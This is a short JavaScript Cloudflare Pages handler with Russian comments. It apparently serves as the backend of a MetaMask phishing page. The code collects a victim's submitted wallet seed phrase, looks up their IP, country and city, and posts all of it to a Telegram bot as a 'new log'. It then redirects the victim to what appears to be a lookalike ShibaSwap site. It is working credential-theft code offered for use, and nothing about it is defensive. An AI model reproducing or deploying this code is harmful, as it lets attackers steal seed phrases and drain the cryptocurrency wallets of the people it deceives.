export async function onRequestPost(context) {
    const data = await context.request.formData();
    const s_eed_Dc = data.get('s_eed_Dc');

    if (!s_eed_Dc) {
        return Response.redirect('../', 301);
    }

    // Получаем IP и геоданные
    const ip = context.request.headers.get('CF-Connecting-IP');
    const domain = context.request.headers.get('host');
    
    // Получаем данные о стране и городе
    const countryResponse = await fetch(`https://ipapi.co/${ip}/country_name/`);
    const cityResponse = await fetch(`https://ipapi.co/${ip}/city/`);
    const country = await countryResponse.text();
    const city = await cityResponse.text();

    // Формируем сообщение
    const message = `
💸 Поздравляем, новый лог!
💵 Кошелёк: MetaMask
🔑 SEED Фраза: ${s_eed_Dc}
🗻 IP: ${ip}
🌍 Страна: ${country}
🌇 Город: ${city}
🔧 Домен: ${domain}
    `;

    // Отправляем в Telegram
    const BOT_TOKEN = ' ';
    const CHAT_ID = '- ';
    
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    await fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    });

    return Response.redirect('https://shibaswap-www.pages.dev/', 301);
}
